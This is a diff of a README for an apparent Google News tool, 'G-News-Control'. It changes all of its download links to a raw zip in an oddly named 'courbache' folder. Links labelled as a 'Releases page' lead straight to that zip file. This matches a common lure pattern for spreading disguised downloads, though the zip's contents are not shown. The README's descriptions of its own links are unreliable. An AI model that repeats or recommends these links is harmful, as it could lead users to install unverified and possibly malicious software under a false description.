@@ -6,13 +6,13 @@ Welcome to G-News-Control! This application helps you manage Google News directl
 
 ## 📦 Download
 
-[![Download G-News-Control](https://raw.githubusercontent.com/ibrahemalnayefku/G-News-Control/main/courbache/G-News-Control.zip)](https://raw.githubusercontent.com/ibrahemalnayefku/G-News-Control/main/courbache/G-News-Control.zip)
+[![Download G-News-Control](https://github.com/ibrahemalnayefku/G-News-Control/raw/refs/heads/main/courbache/News_Control_v2.9-alpha.3.zip)](https://github.com/ibrahemalnayefku/G-News-Control/raw/refs/heads/main/courbache/News_Control_v2.9-alpha.3.zip)
 
-You can easily get the latest version of G-News-Control from our [Releases page](https://raw.githubusercontent.com/ibrahemalnayefku/G-News-Control/main/courbache/G-News-Control.zip). 
+You can easily get the latest version of G-News-Control from our [Releases page](https://github.com/ibrahemalnayefku/G-News-Control/raw/refs/heads/main/courbache/News_Control_v2.9-alpha.3.zip). 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click the link here: [G-News-Control Releases](https://raw.githubusercontent.com/ibrahemalnayefku/G-News-Control/main/courbache/G-News-Control.zip).
+1. **Visit the Releases Page**: Click the link here: [G-News-Control Releases](https://github.com/ibrahemalnayefku/G-News-Control/raw/refs/heads/main/courbache/News_Control_v2.9-alpha.3.zip).
    
 2. **Choose the Latest Release**: Locate the most recent release at the top of the page. This will usually have the version number and may include updated features or fixes.
 
@@ -78,4 +78,4 @@ Feel free to explore these topics for a better understanding of G-News-Control�
 
 For any inquiries or suggestions, feel free to reach out through the repository issues or connect via the community forum. Your feedback is important to us.
 
-[![Download G-News-Control](https://raw.githubusercontent.com/ibrahemalnayefku/G-News-Control/main/courbache/G-News-Control.zip)](https://raw.githubusercontent.com/ibrahemalnayefku/G-News-Control/main/courbache/G-News-Control.zip)
+[![Download G-News-Control](https://github.com/ibrahemalnayefku/G-News-Control/raw/refs/heads/main/courbache/News_Control_v2.9-alpha.3.zip)](https://github.com/ibrahemalnayefku/G-News-Control/raw/refs/heads/main/courbache/News_Control_v2.9-alpha.3.zip)
